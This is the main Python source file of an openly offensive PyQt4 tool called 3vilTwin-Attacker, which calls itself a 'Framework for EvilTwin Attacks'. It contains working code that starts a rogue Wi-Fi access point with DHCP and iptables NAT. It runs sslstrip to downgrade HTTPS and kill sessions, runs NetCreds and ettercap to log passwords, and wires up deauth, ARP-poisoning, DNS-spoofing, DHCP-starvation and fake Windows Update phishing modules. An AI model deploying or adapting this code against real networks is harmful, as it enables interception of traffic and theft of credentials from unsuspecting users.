#The MIT License (MIT)
#Copyright (c) 2015-2016 mh4x0f P0cL4bs Team
#Permission is hereby granted, free of charge, to any person obtaining a copy of
#this software and associated documentation files (the "Software"), to deal in
#the Software without restriction, including without limitation the rights to
#use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
#the Software, and to permit persons to whom the Software is furnished to do so,
#subject to the following conditions:
#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
#FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
#COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
#IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
#CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
from PyQt4.QtGui import *
from PyQt4.QtCore import *
from shutil import move
from sys import argv
import logging
from re import search
from multiprocessing import Process
from time import asctime
from subprocess import Popen,PIPE,STDOUT,call
from Modules.ModuleStarvation import frm_dhcp_main
from Modules.ModuleDeauth import frm_window,frm_deauth
from Modules.ModuleMacchanger import frm_mac_generator
from Modules.ModuleProbeRequest import frm_PMonitor
from Modules.ModuleUpdateFake import frm_update_attack
from Modules.ModuleArpPosion import frm_Arp_Poison
from Modules.Credentials import frm_get_credentials,frm_NetCredsLogger
from Modules.ModuleDnsSpoof import frm_DnsSpoof
from Modules.utils import ProcessThread,Refactor,setup_logger,set_monitor_mode
from Core.Settings import frm_Settings
from Core.about import frmAbout
from twisted.web import http
from twisted.internet import reactor
from Plugins.sslstrip.StrippingProxy import StrippingProxy
from Plugins.sslstrip.URLMonitor import URLMonitor
from Plugins.sslstrip.CookieCleaner import CookieCleaner
from os import geteuid,system,path,getcwd,chdir,remove,popen,listdir
if search('/usr/share/',argv[0]):chdir('/usr/share/3vilTwinAttacker/')
author      = ' @mh4x0f P0cl4bs Team'
emails      = ['mh4root@gmail.com','p0cl4bs@gmail.com']
license     = 'MIT License (MIT)'
version     = '0.6.4'
date_create = '18/01/2015'
update      = '27/07/2015'
desc        = ['Framework for EvilTwin Attacks']

class Initialize(QMainWindow):
    def __init__(self, parent=None):
        super(Initialize, self).__init__(parent)
        self.form_widget    = SubMain(self)
        self.config         = frm_Settings()
        self.setCentralWidget(self.form_widget)
        self.setWindowTitle('3vilTwin-Attacker v' + version)
        self.loadtheme(self.config.XmlThemeSelected())

    def loadtheme(self,theme):
        sshFile=("Core/%s.qss"%(theme))
        with open(sshFile,"r") as fh:
            self.setStyleSheet(fh.read())

    def center(self):
        frameGm = self.frameGeometry()
        centerPoint = QDesktopWidget().availableGeometry().center()
        frameGm.moveCenter(centerPoint)
        self.move(frameGm.topLeft())

    def closeEvent(self, event):
        m = popen('iwconfig').readlines()
        self.interface  = self.config.xmlSettings('interface', 'monitor_mode',None,False)
        for i in m:
            if search('Mode:Monitor',i):
                reply = QMessageBox.question(self, 'About Exit','Are you sure to quit?', QMessageBox.Yes |
                    QMessageBox.No, QMessageBox.No)
                if reply == QMessageBox.Yes:
                    event.accept()
                    set_monitor_mode(self.interface).setDisable()
                else:
                    event.ignore()

class ThRunDhcp(QThread):
    def __init__(self,args):
        QThread.__init__(self)
        self.args = args
        self.process = None

    def run(self):
        print 'Starting Thread:' + self.objectName()
        self.process = p = Popen(self.args,
        stdout=PIPE,stderr=STDOUT)
        setup_logger('dhcp', './Logs/dhcp.log')
        loggerDhcp = logging.getLogger('dhcp')
        loggerDhcp.info('---[ Start DHCP '+asctime()+']---')
        for line,data in enumerate(iter(p.stdout.readline, b'')):
            print data.rstrip()
            if line > 4:
                self.emit(SIGNAL('Activated( QString )'),data.rstrip())
                loggerDhcp.info(data.rstrip())

    def stop(self):
        print 'Stop thread:' + self.objectName()
        if self.process is not None:
            self.process.terminate()
            self.process = None

class Threadsslstrip(QThread):
    def __init__(self,port):
        QThread.__init__(self)
        self.port = port

    def run(self):
        print 'Starting Thread:' + self.objectName()
        listenPort   = self.port
        spoofFavicon = False
        killSessions = True
        print 'SSLstrip v0.9 by Moxie Marlinspike Thread::online'
        URLMonitor.getInstance().setFaviconSpoofing(spoofFavicon)
        CookieCleaner.getInstance().setEnabled(killSessions)
        strippingFactory              = http.HTTPFactory(timeout=10)
        strippingFactory.protocol     = StrippingProxy
        reactor.listenTCP(int(listenPort), strippingFactory)
        reactor.run(installSignalHandlers=False)
    def stop(self):
        print 'Stop thread:' + self.objectName()
        try:
            reactor.stop()
        except:pass


class SubMain(QWidget):
    def __init__(self, parent = None):
        super(SubMain, self).__init__(parent)
        #self.create_sys_tray()
        self.Main           = QVBoxLayout()
        self.config         = frm_Settings()
        self.module_arp     = frm_Arp_Poison()
        self.interface      = 'None'
        self.thread         = []
        self.Apthreads      = {'RougeAP': []}
        self.MonitorImport  = frm_deauth()
        self.PortRedirect   = None
        self.Ap_iface       = None
        self.setGeometry(0, 0, 300, 400)
        self.FSettings = frm_Settings()
        self.intGUI()

    def intGUI(self):
        self.myQMenuBar = QMenuBar(self)
        self.myQMenuBar.setFixedWidth(400)
        self.StatusBar = QStatusBar()
        self.StatusBar.setFixedHeight(15)
        self.StatusBar.addWidget(QLabel("::Access|Point::"))
        self.StatusDhcp = QLabel("")
        self.Started(False)

        Menu_file = self.myQMenuBar.addMenu('&File')
        exportAction = QAction('exportToHtml', self)
        deleteAction = QAction('Clear Logger', self)
        exitAction = QAction('Exit', self)
        exitAction.setIcon(QIcon('rsc/close-pressed.png'))
        deleteAction.setIcon(QIcon('rsc/delete.png'))
        exportAction.setIcon(QIcon('rsc/export.png'))
        Menu_file.addAction(exportAction)
        Menu_file.addAction(deleteAction)
        Menu_file.addAction(exitAction)
        exitAction.triggered.connect(exit)
        deleteAction.triggered.connect(self.delete_logger)
        exportAction.triggered.connect(self.exportHTML)


        Menu_View = self.myQMenuBar.addMenu('&View')
        phishinglog = QAction('Credentials Phishing', self)
        netcredslog = QAction('Credentials NetCreds', self)
        #connect
        phishinglog.triggered.connect(self.credentials)
        netcredslog.triggered.connect(self.logsnetcreds)
        #icons
        phishinglog.setIcon(QIcon('rsc/password.png'))
        netcredslog.setIcon(QIcon('rsc/logger.png'))
        Menu_View.addAction(phishinglog)
        Menu_View.addAction(netcredslog)

        #tools Menu
        Menu_tools = self.myQMenuBar.addMenu('&Tools')
        ettercap = QAction('Active Ettercap', self)
        btn_drift = QAction('Active DriftNet', self)
        btn_drift.setShortcut('Ctrl+Y')
        ettercap.setShortcut('Ctrl+E')
        ettercap.triggered.connect(self.start_etter)
        btn_drift.triggered.connect(self.start_dift)

        # icons tools
        ettercap.setIcon(QIcon('rsc/ettercap.png'))
        btn_drift.setIcon(QIcon('rsc/capture.png'))
        Menu_tools.addAction(ettercap)
        Menu_tools.addAction(btn_drift)

        #menu module
        Menu_module = self.myQMenuBar.addMenu('&Modules')
        btn_deauth = QAction('Deauth Attack', self)
        btn_probe = QAction('Probe Request',self)
        btn_mac = QAction('Mac Changer', self)
        btn_dhcpStar = QAction('DHCP S. Attack',self)
        btn_winup = QAction('Windows Update',self)
        btn_arp = QAction('Arp Posion Attack',self)
        btn_dns = QAction('Dns Spoof Attack',self)
        action_settings = QAction('Settings',self)

        # Shortcut modules
        btn_deauth.setShortcut('Ctrl+W')
        btn_probe.setShortcut('Ctrl+K')
        btn_mac.setShortcut('Ctrl+M')
        btn_dhcpStar.setShortcut('Ctrl+H')
        btn_winup.setShortcut('Ctrl+N')
        btn_dns.setShortcut('ctrl+D')
        btn_arp.setShortcut('ctrl+Q')
        action_settings.setShortcut('Ctrl+X')

        #connect buttons
        btn_probe.triggered.connect(self.showProbe)
        btn_deauth.triggered.connect(self.formDauth)
        btn_mac.triggered.connect(self.form_mac)
        btn_dhcpStar.triggered.connect(self.show_dhcpDOS)
        btn_winup.triggered.connect(self.show_windows_update)
        btn_arp.triggered.connect(self.show_arp_posion)
        btn_dns.triggered.connect(self.show_dns_spoof)
        action_settings.triggered.connect(self.show_settings)

        #icons Modules
        btn_arp.setIcon(QIcon('rsc/arp_.png'))
        btn_winup.setIcon(QIcon('rsc/arp.png'))
        btn_dhcpStar.setIcon(QIcon('rsc/dhcp.png'))
        btn_mac.setIcon(QIcon('rsc/mac.png'))
        btn_probe.setIcon(QIcon('rsc/probe.png'))
        btn_deauth.setIcon(QIcon('rsc/deauth.png'))
        btn_dns.setIcon(QIcon('rsc/dns_spoof.png'))
        action_settings.setIcon(QIcon('rsc/setting.png'))

        # add modules menu
        Menu_module.addAction(btn_deauth)
        Menu_module.addAction(btn_probe)
        Menu_module.addAction(btn_mac)
        Menu_module.addAction(btn_dhcpStar)
        Menu_module.addAction(btn_winup)
        Menu_module.addAction(btn_arp)
        Menu_module.addAction(btn_dns)
        Menu_module.addAction(action_settings)

        #menu extra
        Menu_extra= self.myQMenuBar.addMenu('&Extra')
        Menu_about = QAction('About',self)
        Menu_help = QAction('Help',self)
        #icons extra
        Menu_about.setIcon(QIcon('rsc/about.png'))
        Menu_help.setIcon(QIcon('rsc/report.png'))
        Menu_about.triggered.connect(self.about)
        Menu_extra.addAction(Menu_about)

        self.EditGateway = QLineEdit(self)
        self.EditApName = QLineEdit(self)
        self.EditChannel = QLineEdit(self)
        self.selectCard = QComboBox(self)
        self.ListLoggerDhcp = QListWidget(self)
        self.ListLoggerDhcp.setFixedHeight(150)
        try:
            self.EditGateway.setText([Refactor.get_interfaces()[x] for x in Refactor.get_interfaces().keys() if x == 'gateway'][0])
        except:pass
        self.EditApName.setText(self.config.xmlSettings('AP', 'name',None,False))
        self.EditChannel.setText(self.config.xmlSettings('channel', 'mchannel',None,False))
        self.PortRedirect = self.config.xmlSettings('redirect', 'port',None,False)

        n = Refactor.get_interfaces()['all']
        for i,j in enumerate(n):
            if search('wlan', j):
                self.selectCard.addItem(n[i])

        if not path.isfile('Modules/Templates/Windows_Update/Settins_WinUpdate.html'):
            system('cp Settings/source.tar.gz Modules/Templates/')
            system('cd Modules/Templates/ && tar -xf source.tar.gz')
            remove('Modules/Templates/source.tar.gz')

        driftnet = popen('which driftnet').read().split('\n')
        ettercap = popen('which ettercap').read().split('\n')
        dhcpd = popen('which dhcpd').read().split("\n")
        dnsmasq = popen('which dnsmasq').read().split("\n")
        lista = [ '/usr/sbin/airbase-ng', ettercap[0],driftnet[0],dhcpd[0],dnsmasq[0]]
        self.m = []
        for i in lista:self.m.append(path.isfile(i))

        self.FormGroup1 = QFormLayout()
        self.FormGroup2 = QFormLayout()
        self.FormGroup3 = QFormLayout()
        hLine = QFrame()
        hLine.setFrameStyle(QFrame.HLine)
        hLine.setSizePolicy(QSizePolicy.Minimum,QSizePolicy.Expanding)
        hLine2 = QFrame()
        hLine2.setFrameStyle(QFrame.HLine)
        hLine2.setSizePolicy(QSizePolicy.Minimum,QSizePolicy.Expanding)
        vbox = QVBoxLayout()
        vbox.setMargin(5)
        vbox.addStretch(20)
        self.FormGroup1.addRow(vbox)
        self.logo = QPixmap(getcwd() + '/rsc/logo.png')
        self.imagem = QLabel()
        self.imagem.setPixmap(self.logo)
        self.FormGroup1.addRow(self.imagem)


        self.GroupAP = QGroupBox()
        self.GroupAP.setTitle('Access Point::')
        self.FormGroup3.addRow('Gateway:', self.EditGateway)
        self.FormGroup3.addRow('AP Name:', self.EditApName)
        self.FormGroup3.addRow('Channel:', self.EditChannel)
        self.GroupAP.setLayout(self.FormGroup3)

        # grid network adapter fix
        self.btrn_refresh = QPushButton('Refresh')
        self.btrn_refresh.setIcon(QIcon('rsc/refresh.png'))
        self.btrn_refresh.clicked.connect(self.refrash_interface)

        self.layout = QFormLayout()
        self.GroupAdapter = QGroupBox()
        self.GroupAdapter.setTitle('Network Adapter::')
        self.layout.addRow(self.selectCard)
        self.layout.addRow(self.btrn_refresh)
        self.GroupAdapter.setLayout(self.layout)


        self.btn_start_attack = QPushButton('Start Attack', self)
        self.btn_start_attack.setIcon(QIcon('rsc/start.png'))
        self.btn_cancelar = QPushButton('Stop Attack', self)
        self.btn_cancelar.setIcon(QIcon('rsc/Stop.png'))
        self.btn_cancelar.clicked.connect(self.kill)
        self.btn_start_attack.clicked.connect(self.StartApFake)

        hBox	 = QHBoxLayout()
        hBox.addWidget(self.btn_start_attack)
        hBox.addWidget(self.btn_cancelar)

        self.slipt = QHBoxLayout()
        self.slipt.addWidget(self.GroupAP)
        self.slipt.addWidget(self.GroupAdapter)

        self.FormGroup2.addRow(hBox)
        self.FormGroup2.addRow(self.ListLoggerDhcp)
        self.FormGroup2.addRow(self.StatusBar)
        self.Main.addLayout(self.FormGroup1)
        self.Main.addLayout(self.slipt)
        self.Main.addLayout(self.FormGroup2)
        self.setLayout(self.Main)

    def show_arp_posion(self):
        self.Farp_posion = frm_Arp_Poison()
        self.Farp_posion.setGeometry(0, 0, 450, 300)
        self.Farp_posion.show()
    def show_settings(self):
        self.FSettings.show()
    def show_windows_update(self):
        self.FWinUpdate = frm_update_attack()
        self.FWinUpdate.setGeometry(QRect(100, 100, 450, 300))
        self.FWinUpdate.show()
    def show_dhcpDOS(self):
        self.Fstar = frm_dhcp_main()
        self.Fstar.setGeometry(QRect(100, 100, 450, 200))
        self.Fstar.show()
    def showProbe(self):
        self.Fprobe = frm_PMonitor()
        self.Fprobe.setGeometry(QRect(100, 100, 400, 200))
        self.Fprobe.show()
    def formDauth(self):
        self.Fdeauth = frm_window()
        self.Fdeauth.setGeometry(QRect(100, 100, 200, 200))
        self.Fdeauth.show()
    def form_mac(self):
        self.Fmac = frm_mac_generator()
        self.Fmac.setGeometry(QRect(100, 100, 300, 100))
        self.Fmac.show()
    def show_dns_spoof(self):
        self.Fdns = frm_DnsSpoof()
        self.Fdns.setGeometry(QRect(100, 100, 450, 300))
        self.Fdns.show()

    def credentials(self):
        self.Fcredentials = frm_get_credentials()
        self.Fcredentials.setWindowTitle('Get credentials Phishing')
        self.Fcredentials.show()

    def logsnetcreds(self):
        self.FnetCreds = frm_NetCredsLogger()
        self.FnetCreds.setWindowTitle('NetCreds Logger')
        self.FnetCreds.show()

    def Started(self,bool):
        if bool:
            self.StatusDhcp.setText("[ON]")
            self.StatusDhcp.setStyleSheet("QLabel {  color : green; }")
        else:
            self.StatusDhcp.setText("[OFF]")
            self.StatusDhcp.setStyleSheet("QLabel {  color : red; }")
        self.StatusBar.addWidget(self.StatusDhcp)

    def dhcpLog(self,log):
        self.ListLoggerDhcp.addItem(log)
        self.ListLoggerDhcp.scrollToBottom()

    def exportHTML(self):
        contents = Refactor.exportHtml()
        filename = QFileDialog.getSaveFileNameAndFilter(self,
        "Save File Logger HTML","report.html","HTML (*.html)")
        if len(filename) != 0:
            with open(str(filename[0]),'w') as filehtml:
                filehtml.write(contents),filehtml.close()

    def refrash_interface(self):
        self.selectCard.clear()
        n = Refactor.get_interfaces()['all']
        for i,j in enumerate(n):
            if search('wlan', j):
                self.selectCard.addItem(n[i])

    def kill(self):
        if self.Apthreads['RougeAP'] == []:return
        for i in self.Apthreads['RougeAP']:i.stop()
        terminate = [
        'killall dhcpd',
        'killall dnsmasq'
        'killall xterm',
        'iptables --flush',
        'iptables --table nat --flush',
        'iptables --delete-chain',
        'iptables --table nat --delete-chain']
        for delete in terminate:popen(delete)
        set_monitor_mode(self.interface).setDisable()
        self.Started(False)
        Refactor.set_ip_forward(0)
        self.ListLoggerDhcp.clear()

    def delete_logger(self):
        if listdir('Logs')!= '':
            resp = QMessageBox.question(self, 'About Delete Logger',
                'do you want to delete Logs?',QMessageBox.Yes |
                    QMessageBox.No, QMessageBox.No)
            if resp == QMessageBox.Yes:
                system('rm Logs/*.cap')
                system('rm Logs/*.log')

    def start_etter(self):
        if self.m[1]:
            if search(self.Ap_iface,str(popen('ifconfig').read())):
                call(['sudo', 'xterm', '-geometry', '73x25-1+50',
                '-T', 'ettercap', '-s', '-sb', '-si', '+sk', '-sl',
                    '5000', '-e', 'ettercap', '-p', '-u', '-T', '-q', '-w',
                      'Logs/passwords', '-i', self.Ap_iface])
        else:
            QMessageBox.information(self,'ettercap','ettercap not found.')
    def start_dift(self):
        if self.m[2]:
            if search(self.Ap_iface,str(popen('ifconfig').read())):
                call(['sudo', 'xterm', '-geometry', '75x15+1+200',
                    '-T', 'DriftNet', '-e', 'driftnet', '-i', self.Ap_iface])
        else:
            QMessageBox.information(self,'driftnet','driftnet not found.')

    def CoreSettings(self):
        range_dhcp = self.config.xmlSettings('Iprange', 'range',None,False)
        self.PortRedirect = self.config.xmlSettings('redirect', 'port',None,False)
        self.SettingsAP = {
        'interface':
            [
                'ifconfig %s up'%(self.Ap_iface),
                'ifconfig %s 10.0.0.1 netmask 255.255.255.0'%(self.Ap_iface),
                'ifconfig %s mtu 1400'%(self.Ap_iface),
                'route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1'
            ],
        'kill':
            [
                'iptables --flush',
                'iptables --table nat --flush',
                'iptables --delete-chain',
                'iptables --table nat --delete-chain',
                'killall dhpcd',
                'killall dnsmasq'
            ],
        'dhcp-server':
            [
                'authoritative;\n',
                'default-lease-time 600;\n',
                'max-lease-time 7200;\n',
                'subnet 10.0.0.0 netmask 255.255.255.0 {\n',
                'option routers 10.0.0.1;\n',
                'option subnet-mask 255.255.255.0;\n',
                'option domain-name \"%s\";\n'%(str(self.EditApName.text())),
                'option domain-name-servers 10.0.0.1;\n',
                'range %s;\n'% range_dhcp,
                '}',
            ],
        'dnsmasq':
            [
                'interface=%s\n'%(self.Ap_iface),
                'dhcp-range=10.0.0.10,10.0.0.50,12h\n',
                'server=8.8.8.8\n',
                'server=8.8.4.4\n',
            ]
        }
        Refactor.set_ip_forward(1)
        for i in self.SettingsAP['interface']:popen(i)
        for i in self.SettingsAP['kill']:popen(i)
        dhcp_select = self.config.xmlSettings('dhcp','dhcp_server',None,False)
        if dhcp_select != 'dnsmasq':
            with open('Settings/dhcpd.conf','w') as dhcp:
                for i in self.SettingsAP['dhcp-server']:
                    dhcp.write(i)
                dhcp.close()
                if path.isfile('/etc/dhcp/dhcpd.conf'):
                    system('rm /etc/dhcp/dhcpd.conf')
                move('Settings/dhcpd.conf', '/etc/dhcp/')
        else:
            with open('Settings/dnsmasq.conf','w') as dhcp:
                for i in self.SettingsAP['dnsmasq']:
                    dhcp.write(i)
                dhcp.close()

    def StartApFake(self):
        self.ListLoggerDhcp.clear()
        if geteuid() != 0:
            QMessageBox.warning(self,'Error permission','Run as root ')
            return
        if len(self.selectCard.currentText()) == 0:
            QMessageBox.warning(self,'Error interface','Network interface not supported :(')
            return
        dhcp_select = self.config.xmlSettings('dhcp','dhcp_server',None,False)
        if dhcp_select != 'dnsmasq':
            if not self.m[3]:
                QMessageBox.warning(self,'Error dhcp','isc-dhcp-server not installed')
                return
        else:
            if not self.m[4]:
                QMessageBox.information(self,'Error dhcp','dnsmasq not installed')
                return
        self.interface = str(set_monitor_mode(self.selectCard.currentText()).setEnable())
        self.config.xmlSettings('interface', 'monitor_mode',self.interface,False)
        # airbase thread
        Thread_airbase = ProcessThread(['airbase-ng',
        '-c', str(self.EditChannel.text()), '-e', self.EditApName.text(),
        '-F', 'Logs/'+asctime(),self.interface])
        Thread_airbase.name = 'Airbase-ng'
        self.Apthreads['RougeAP'].append(Thread_airbase)
        Thread_airbase.start()

        # settings conf
        while True:
            if Thread_airbase.iface != None:
                self.Ap_iface = [x for x in Refactor.get_interfaces()['all'] if search('at',x)][0]
                self.config.xmlSettings('netcreds', 'interface',self.Ap_iface,False)
                break

        # thread netcreds
        Thread_netcreds = ProcessThread(['python','Plugins/NetCreds.py','-i',
        self.config.xmlSettings('netcreds', 'interface',None,False)])
        Thread_netcreds.setName('Net-Creds')
        self.Apthreads['RougeAP'].append(Thread_netcreds)
        Thread_netcreds.start()
        p = Process(target=self.CoreSettings,args=())
        p.start(),p.join()

        # thread dhcp
        selected_dhcp = self.config.xmlSettings('dhcp','dhcp_server',None,False)
        if selected_dhcp == 'iscdhcpserver':
            Thread_dhcp = ThRunDhcp(['sudo','dhcpd','-d','-f','-cf','/etc/dhcp/dhcpd.conf',self.Ap_iface])
            self.connect(Thread_dhcp,SIGNAL('Activated ( QString ) '), self.dhcpLog)
            Thread_dhcp.setObjectName('DHCP')
            self.Apthreads['RougeAP'].append(Thread_dhcp)
            Thread_dhcp.start()
            self.Started(True)
        elif selected_dhcp == 'dnsmasq':
            Thread_dhcp = ThRunDhcp(['dnsmasq','-C','Settings/dnsmasq.conf','-d'])
            self.connect(Thread_dhcp ,SIGNAL('Activated ( QString ) '), self.dhcpLog)
            Thread_dhcp .setObjectName('DHCP')
            self.Apthreads['RougeAP'].append(Thread_dhcp)
            Thread_dhcp .start()
            self.Started(True)
        else:
            QMessageBox.information(self,'DHCP','dhcp not found.')
        # thread sslstrip
        Thread_sslstrip = Threadsslstrip(self.PortRedirect)
        Thread_sslstrip.setObjectName("sslstrip")
        self.Apthreads['RougeAP'].append(Thread_sslstrip)
        Thread_sslstrip.start()
        iptables = []
        for index in xrange(self.FSettings.ListRules.count()):
           iptables.append(str(self.FSettings.ListRules.item(index).text()))
        for rules in iptables:
            if search('PREROUTING -p udp -j DNAT --to',rules):
                popen(rules.replace('$$',str(self.EditGateway.text())))
            elif search('--append FORWARD --in-interface',rules):popen(rules.replace('$$',self.Ap_iface))
            elif search('--append POSTROUTING --out-interface',rules):
                popen(rules.replace('$$',str(Refactor.get_interfaces()['activated'])))
            else:
                popen(rules)
    def create_sys_tray(self):
        self.sysTray = QSystemTrayIcon(self)
        self.sysTray.setIcon(QIcon('rsc/icon.ico'))
        self.sysTray.setVisible(True)
        self.connect(self.sysTray,
        SIGNAL('activated(QSystemTrayIcon::ActivationReason)'),
            self.on_sys_tray_activated)
        self.sysTrayMenu = QMenu(self)
        act = self.sysTrayMenu.addAction('FOO')

    def on_sys_tray_activated(self, reason):
        if reason == 3:self.showNormal()
        elif reason == 2:self.showMinimized()

    def about(self):
        self.Fabout = frmAbout(author,emails,
        version,date_create,update,license,desc)
        self.Fabout.show()
